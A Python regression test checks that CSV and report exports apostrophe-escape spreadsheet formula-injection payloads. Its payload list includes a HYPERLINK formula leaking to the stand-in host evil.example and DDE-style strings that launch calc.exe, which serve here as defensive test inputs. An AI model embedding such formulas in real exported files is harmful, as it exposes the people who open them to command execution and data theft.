"""Regression test for Strix vuln-0004 (CSV/Excel formula injection).

Any exported cell whose first non-space character would be treated as a
formula by Excel/Sheets/LibreOffice must be apostrophe-prefixed. Covers BOTH
sinks: the shared export flattener and the 3-tab report writer helper.
"""

from app.services.exporters import _escape_formula as escape_export, _flatten_rows
from app.services.reporting import _escape_formula as escape_report

PAYLOADS = [
    "=HYPERLINK(\"https://evil.example/leak\",\"x\")",
    "+1+cp /c calc.exe",
    "-2+3",
    "@SUM(1+1)*cmd",
    "\t=evil",
    "\r=evil",
    "  =leading-spaces-count",
    "\x0b=vertical-tab",
]

SAFE = ["Ann Weaver", "E-100", "8", "Ops", "", "name-with-dash@inside.it"]


class TestExportEscaping:
    def test_every_dangerous_prefix_is_escaped_exports(self):
        for payload in PAYLOADS:
            assert escape_export(payload).startswith("'"), payload

    def test_normal_values_pass_through(self):
        for value in SAFE:
            assert escape_export(value) == value

    def test_flatten_rows_escapes_all_columns(self):
        cols = ["full_name", "employee_code", "note"]
        rows = [
            {"full_name": "=cmd|' /C calc'!A0", "employee_code": "E-1", "note": "@DDE"},
            {"full_name": "Normal Person", "employee_code": "E-2"},
        ]
        _, out = _flatten_rows(rows, cols)
        for row in out:
            for cell in row:
                assert not cell.lstrip(" ").startswith(("=", "+", "-", "@", "\t", "\r"))
        # safe rows untouched
        assert out[1] == ["Normal Person", "E-2", ""]

    def test_report_writer_escapes_and_is_type_safe(self):
        for payload in PAYLOADS:
            assert escape_report(payload).startswith("'"), payload
        assert escape_report(42) == "42"  # non-string cells coerce safely
        assert escape_report(None) == "None"
        for value in SAFE:
            assert escape_report(value) == value
